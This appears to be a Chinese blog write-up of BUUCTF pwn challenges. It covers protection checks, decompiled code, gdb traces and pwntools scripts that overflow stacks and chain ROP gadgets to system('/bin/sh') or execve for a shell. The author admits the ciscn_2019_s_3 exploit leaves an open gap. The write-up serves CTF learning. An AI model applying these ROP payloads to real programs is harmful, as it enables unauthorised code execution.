<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>data<span class="token punctuation">:</span><span class="token number">0000000000601048</span>    <span class="token number">00000008</span>    C    <span class="token operator">/</span>bin<span class="token operator">/</span>sh
LOAD<span class="token punctuation">:</span><span class="token number">0000000000400238</span>    0000001C    C    <span class="token operator">/</span>lib64<span class="token operator">/</span>ld<span class="token operator">-</span>linux<span class="token operator">-</span>x86<span class="token number">-64</span><span class="token punctuation">.</span>so<span class="token number">.2</span>
<span class="token punctuation">.</span>eh_frame<span class="token punctuation">:</span><span class="token number">0000000000400787</span>    <span class="token number">00000006</span>    C    <span class="token punctuation">;</span><span class="token operator">*</span><span class="token number">3</span>$\"
LOAD<span class="token punctuation">:</span>000000000040039B    0000000C    C    GLIBC_2<span class="token number">.2</span><span class="token punctuation">.</span><span class="token number">5</span>
LOAD<span class="token punctuation">:</span><span class="token number">0000000000400391</span>    0000000A    C    GLIBC_2<span class="token number">.7</span>
<span class="token punctuation">.</span>rodata<span class="token punctuation">:</span>00000000004006C8    <span class="token number">0000001F</span>    C    Welcome to the Pwn World<span class="token punctuation">,</span> <span class="token operator">%</span>s<span class="token operator">!</span>\n
LOAD<span class="token punctuation">:</span><span class="token number">0000000000400382</span>    <span class="token number">0000000F</span>    C    __gmon_start__
LOAD<span class="token punctuation">:</span><span class="token number">0000000000400353</span>    <span class="token number">0000000F</span>    C    __isoc99_scanf
LOAD<span class="token punctuation">:</span><span class="token number">0000000000400370</span>    <span class="token number">00000012</span>    C    __libc_start_main
<span class="token punctuation">.</span>rodata<span class="token punctuation">:</span>00000000004006A8    0000001D    C    echo <span class="token operator">-</span>n \"What's your name<span class="token operator">?</span> \"
LOAD<span class="token punctuation">:</span><span class="token number">0000000000400349</span>    0000000A    C    libc<span class="token punctuation">.</span>so<span class="token number">.6</span>
LOAD<span class="token punctuation">:</span><span class="token number">0000000000400362</span>    <span class="token number">00000007</span>    C    printf
LOAD<span class="token punctuation">:</span><span class="token number">0000000000400369</span>    <span class="token number">00000007</span>    C    system
</code></pre>
<p>看到也给了/bin/sh 那就很简单了</p>
<p>找一个gadget pop rdi ret。传sh地址 接着ret到system就可以起shell了</p>
<h4 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'HarekazeCTF2019_babyrop'</span><span class="token punctuation">)</span>
pop_rdi<span class="token operator">=</span><span class="token number">0x0000000000400683</span> <span class="token comment" spellcheck="true"># pop rdi ; ret</span>
payload<span class="token operator">=</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x601048</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x400490</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~/APwn/buuctf$ checksec ciscn_2019_s_3
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/APwn/buuctf/ciscn_2019_s_3'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
ios@ubuntu:~/APwn/buuctf$
</code></pre>
<p>查看源代码</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>main调用vuln</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">signed</span> __int64 <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">signed</span> __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>

  __asm <span class="token punctuation">{</span> syscall<span class="token punctuation">;</span> LINUX <span class="token operator">-</span> sys_read <span class="token punctuation">}</span>
  result <span class="token operator">=</span> <span class="token number">1LL</span><span class="token punctuation">;</span>
  __asm <span class="token punctuation">{</span> syscall<span class="token punctuation">;</span> LINUX <span class="token operator">-</span> sys_write <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>汇编 执行syscall 调用系统号 read 接着执行syscall 调用系统号 write</p>
<p>而64位执行syscall时 系统号存入rax</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>.text:00000000004004ED ; __unwind {
.text:00000000004004ED                 push    rbp
.text:00000000004004EE                 mov     rbp, rsp
.text:00000000004004F1                 xor     rax, rax
.text:00000000004004F4                 mov     edx, 400h       ; count
.text:00000000004004F9                 lea     rsi, [rsp+buf]  ; buf
.text:00000000004004FE                 mov     rdi, rax        ; fd
.text:0000000000400501                 syscall                 ; LINUX - sys_read
.text:0000000000400503                 mov     rax, 1
.text:000000000040050A                 mov     edx, 30h        ; count
.text:000000000040050F                 lea     rsi, [rsp+buf]  ; buf
.text:0000000000400514                 mov     rdi, rax        ; fd
.text:0000000000400517                 syscall                 ; LINUX - sys_write
.text:0000000000400519                 retn
</code></pre><p>看汇编可以知道 xor 这里将rax值变为0</p>
<p>查系统调用</p>
<p><img src="/2020/02/23/buuctf-Writeup/ios/ios/source/_posts/buuctf-Writeup/QQ20200226-190829@2x.png" alt="1"></p>
<p>0在64位中为系统调用read</p>
<p>继续看代码 </p>
<p></p><p class="code-caption" data-lang="assembly" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-assembly"><code class="language-assembly">.text:0000000000400503                 mov     rax, 1
</code></pre>
<p>这里rax=1 查系统调用</p>
<p><img src="/2020/02/23/buuctf-Writeup/ios/ios/source/_posts/buuctf-Writeup/QQ20200226-191102@2x.png" alt="QQ20200226-191102@2x"></p>
<p>和f5编译过来一致</p>
<p>接着debug测试read 找是否存在溢出</p>
<p></p><p class="code-caption" data-lang="assembly" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-assembly"><code class="language-assembly">[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400519 in vuln ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0x30
 RBX  0x0
 RCX  0x400519 (vuln+44) ◂— ret    
 RDX  0x30
 RDI  0x1
 RSI  0x7fffffffdcf0 ◂— 0x4173414125414141 ('AAA%AAsA')
 R8   0x4005b0 (__libc_csu_fini) ◂— ret    
 R9   0x7ffff7de7ac0 (_dl_fini) ◂— push   rbp
 R10  0x846
 R11  0x246
 R12  0x4003e0 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffde00 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdd00 ◂— 0x41412d4141434141 ('AACAA-AA')
 RSP  0x7fffffffdd00 ◂— 0x41412d4141434141 ('AACAA-AA')
 RIP  0x400519 (vuln+44) ◂— ret    
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x400519 <vuln+44>    ret    <0x41412d4141434141>










───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rbp rsp  0x7fffffffdd00 ◂— 0x41412d4141434141 ('AACAA-AA')
01:0008│          0x7fffffffdd08 ◂— 0x413b414144414128 ('(AADAA;A')
02:0010│          0x7fffffffdd10 ◂— 0x6141414541412941 ('A)AAEAAa')
03:0018│          0x7fffffffdd18 ◂— 0x4141464141304141 ('AA0AAFAA')
04:0020│          0x7fffffffdd20 ◂— 0x4147414131414162 ('bAA1AAGA')
05:0028│          0x7fffffffdd28 ◂— 0x4841413241416341 ('AcAA2AAH')
06:0030│          0x7fffffffdd30 ◂— 0x4141334141644141 ('AAdAA3AA')
07:0038│          0x7fffffffdd38 ◂— 0x4134414165414149 ('IAAeAA4A')
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0           400519 vuln+44
   f 1 41412d4141434141
   f 2 413b414144414128
   f 3 6141414541412941
   f 4 4141464141304141
   f 5 4147414131414162
   f 6 4841413241416341
   f 7 4141334141644141
   f 8 4134414165414149
   f 9 3541416641414a41
   f 10 41416741414b4141
Program received signal SIGSEGV (fault address 0x0)
gdb-peda$ pattern offset 0x41412d4141434141
4702089244242559297 found at offset: 16
gdb-peda$
</code></pre>
<p>得到存在溢出 偏移为16</p>
<p></p><p class="code-caption" data-lang="assembly" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-assembly"><code class="language-assembly">.text:00000000004004D6                 public gadgets
.text:00000000004004D6 gadgets         proc near
.text:00000000004004D6 ; __unwind {
.text:00000000004004D6                 push    rbp
.text:00000000004004D7                 mov     rbp, rsp
.text:00000000004004DA                 mov     rax, 0Fh
.text:00000000004004E1                 retn
.text:00000000004004E1 gadgets         endp ; sp-analysis failed
.text:00000000004004E1
.text:00000000004004E2 ; ---------------------------------------------------------------------------
.text:00000000004004E2                 mov     rax, 3Bh
.text:00000000004004E9                 retn
</code></pre>
<p>题目中给出一函数gadget  查看汇编可以发现有两段调用号</p>
<p>rax=0xf、rax=0x3B</p>
<p><img src="/2020/02/23/buuctf-Writeup/ios/ios/source/_posts/buuctf-Writeup/QQ20200226-192018@2x.png" alt="QQ20200226-192018@2x"></p>
<p><img src="/2020/02/23/buuctf-Writeup/ios/ios/source/_posts/buuctf-Writeup/QQ20200226-192032@2x.png" alt="QQ20200226-192032@2x"></p>
<p>得到两个系统调用 rt_sigreturn和execve</p>
<p>给了两个系统调用 我们采用execve调用来执行binsh </p>
<p>函数的原型：</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>filename<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>我们需要完成构造execve(‘bin/sh’,0,0)</p>
<p>64位中我们可以采用通用gadget进行rop</p>
<p>__libc_csu_init</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>.text:0000000000400580 loc_400580:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400580                 mov     rdx, r13
.text:0000000000400583                 mov     rsi, r14
.text:0000000000400586                 mov     edi, r15d
.text:0000000000400589                 call    qword ptr [r12+rbx*8]
.text:000000000040058D                 add     rbx, 1
.text:0000000000400591                 cmp     rbx, rbp
.text:0000000000400594                 jnz     short loc_400580
.text:0000000000400596
.text:0000000000400596 loc_400596:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400596                 add     rsp, 8
.text:000000000040059A                 pop     rbx
.text:000000000040059B                 pop     rbp
.text:000000000040059C                 pop     r12
.text:000000000040059E                 pop     r13
.text:00000000004005A0                 pop     r14
.text:00000000004005A2                 pop     r15
.text:00000000004005A4                 retn
</code></pre><p>此处有三段gadget</p>
<p>gadget1</p>
<p></p><p class="code-caption" data-lang="assembly" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-assembly"><code class="language-assembly">.text:000000000040059A                 pop     rbx
.text:000000000040059B                 pop     rbp
.text:000000000040059C                 pop     r12
.text:000000000040059E                 pop     r13
.text:00000000004005A0                 pop     r14
.text:00000000004005A2                 pop     r15
.text:00000000004005A4                 retn
</code></pre>
<p>ret后接gadget2</p>
<p></p><p class="code-caption" data-lang="assembly" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-assembly"><code class="language-assembly">.text:0000000000400580                 mov     rdx, r13
.text:0000000000400583                 mov     rsi, r14
.text:0000000000400586                 mov     edi, r15d
.text:0000000000400589                 call    qword ptr [r12+rbx*8]
.text:000000000040058D                 add     rbx, 1
.text:0000000000400591                 cmp     rbx, rbp
.text:0000000000400594                 jnz     short loc_400580
</code></pre>
<p>方便getshell的gadget3</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>.text:00000000004005A3                 分割pop r15 可以得到 pop rdi
</code></pre><p>本题有区别的地方是 如果使rbp=1 在执行完gadget2后填充56字节到ret是不可行的，填充后会溢出stack 无法构造rop</p>
<p>首先需要确定输入binsh后的地址</p>
<p>在执行syscall前下断 可以找到对应栈地址</p>
<p><img src="/2020/02/23/buuctf-Writeup/ios/ios/source/_posts/buuctf-Writeup/QQ20200227-104308@2x.png" alt="QQ20200227-104308@2x"></p>
<p>接着查看write的输出</p>
<p><img src="/2020/02/23/buuctf-Writeup/ios/ios/source/_posts/buuctf-Writeup/QQ20200227-104535@2x.png" alt="QQ20200227-104535@2x"></p>
<p>看到这里有打印出栈中地址 通过多次debug 确定该地址距离binsh偏移固定</p>
<p></p><p class="code-caption" data-lang="assembly" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-assembly"><code class="language-assembly">gdb-peda$ p/x 0x7ffc6ae754b8- 0x7ffc6ae753a0
$1 = 0x118
gdb-peda$
</code></pre>
<p>所以第一次溢出主要目的写入 binsh以及leak写入地址 控制ret重新载入vuln</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token string">"b *"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span><span class="token punctuation">)</span>
payload1<span class="token operator">=</span><span class="token string">"/bin/sh\x00"</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span>
<span class="token keyword">print</span> len<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
base<span class="token operator">=</span>u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>base<span class="token punctuation">)</span>
sh_addr<span class="token operator">=</span>base<span class="token number">-0x118</span>
</code></pre>
<p>第二次则需要利用三段gadget进行参数控制 构造execve(‘bin/sh’,0,0)</p>
<p>这里也需要注意 如果rbp=0 时 gadget2 中会满足jnz跳转 跳转后再次执行gadget2</p>
<p>且第一次执行时会call r12，再次跳转会执行payload中gadget2的下一位地址</p>
<p>之后调用gadget3 rdi赋值为sh地址 ret syscall 即可getshell</p>
<p>留个小坑 后面继续搞</p>
<h4 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./ciscn_2019_s_3'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#define __NR_rt_sigreturn 15</span>
sigreturn<span class="token operator">=</span><span class="token number">0x4004DA</span><span class="token comment" spellcheck="true"># mov     rax, 0Fh</span>
<span class="token comment" spellcheck="true">#define __NR_execve 59</span>
execve<span class="token operator">=</span><span class="token number">0x4004E2</span><span class="token comment" spellcheck="true"># mov     rax, 3Bh</span>
gadget1<span class="token operator">=</span><span class="token number">0x40059A</span><span class="token comment" spellcheck="true">#pop rbx rbp r12 r13 r14 r15</span>
gadget2<span class="token operator">=</span><span class="token number">0x400580</span><span class="token comment" spellcheck="true">#mov rdx r13 ,mov rsi r14 call r12</span>
gadget3<span class="token operator">=</span><span class="token number">0x4005A3</span><span class="token comment" spellcheck="true">#pop rdi ret</span>
vuln<span class="token operator">=</span><span class="token number">0x4004ED</span>
syscall<span class="token operator">=</span><span class="token number">0x400517</span>
gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token string">"b *"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span><span class="token punctuation">)</span>
payload1<span class="token operator">=</span><span class="token string">"/bin/sh\x00"</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span>
<span class="token keyword">print</span> len<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>


p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
base<span class="token operator">=</span>u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>base<span class="token punctuation">)</span>
sh_addr<span class="token operator">=</span>base<span class="token number">-0x118</span>
<span class="token comment" spellcheck="true">#sh_addr+0x50 -> 0x4004E2</span>
payload2<span class="token operator">=</span><span class="token string">"/bin/sh\x00"</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>gadget1<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sh_addr<span class="token operator">+</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>gadget2<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>execve<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>gadget3<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h1 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h1><p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~/APwn/buuctf$ checksec level0 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/APwn/buuctf/level0'</span>
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
</code></pre>
<p>查看源代码</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">ssize_t <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-80h]</span>

  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这题没啥难度 给了shell</p>
<p>直接溢出到ret起shell</p>
<p>确定偏移</p>
<p></p><p class="code-caption" data-lang="assembly" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-assembly"><code class="language-assembly">Program received signal SIGSEGV (fault address 0x0)
gdb-peda$ pattern offset 0x41416d4141514141
4702159612987654465 found at offset: 136
gdb-peda$
</code></pre>
<h4 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./level0'</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">136</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x400596</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h1 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h1><p>在无put write时利用printf 泄漏地址</p>
<p>检查保护</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>ios@ubuntu:~/APwn/buuctf$ checksec babyrop2
[*] &#39;/home/ios/APwn/buuctf/babyrop2&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre><p>查看代码</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-20h]</span>
  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What's your name? "</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v6 <span class="token operator">=</span> v3<span class="token punctuation">;</span>
  buf<span class="token punctuation">[</span>v3 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to the Pwn World again, %s!\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>很直观buf会被溢出 </p>
<p>基本思路 leak 函数地址 计算偏移 getshell</p>
<p>题目没用write puts用了printf 所以我们就来利用printf 来leak函数地址</p>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>首页printf如何输出地址？</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>read<span class="token punctuation">)</span>或者<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"格式化字符串"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>read<span class="token punctuation">)</span>
</code></pre>
<p>需要构造成这样</p>
<p>这里的格式化可以通过题目中有的或者find得到去构造</p>
<p>64位参数传递需要通过寄存器</p>
<p></p><p class="code-caption" data-lang="assembly" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
